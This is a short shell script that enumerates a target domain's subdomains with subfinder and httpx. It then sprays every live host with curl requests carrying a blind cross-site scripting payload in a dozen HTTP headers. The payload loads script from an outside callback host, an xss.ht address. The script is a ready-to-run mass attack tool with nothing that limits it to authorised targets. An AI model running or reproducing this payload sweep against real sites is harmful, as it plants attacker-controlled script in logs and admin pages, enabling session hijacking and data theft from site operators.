#!/bin/sh
#install subfinder
docker pull projectdiscovery/subfinder
sleep 1

#alias subfinder
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'
sleep 1

#install httpx
docker pull projectdiscovery/httpx
sleep 1

#alias httpx
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'

sleep 1

echo "subfinder & httpx  successfully installs "


#enumeration subdomain
subfinder -d $1 -silent >> $1subdomain.txt
 sleep 1

wc -l <  $1subdomain.txt 
 echo "enumeration subdomain  successfully  " 
sleep 1

echo "enumeration httpx  successfully  " 
httpx -l $1subdomain.txt  >> $1live.txt

wc -l <  $1live.txt


#blindxss


while read line; do curl -sSf $line -Is  -H 'User-Agent: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-Host: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Requested-With: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-For: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-Proto: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Correlation-ID: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-real-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-request-uri: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"' | head -n 1; done < $1live.txt


 echo " BLIND XSS  successfully  " 
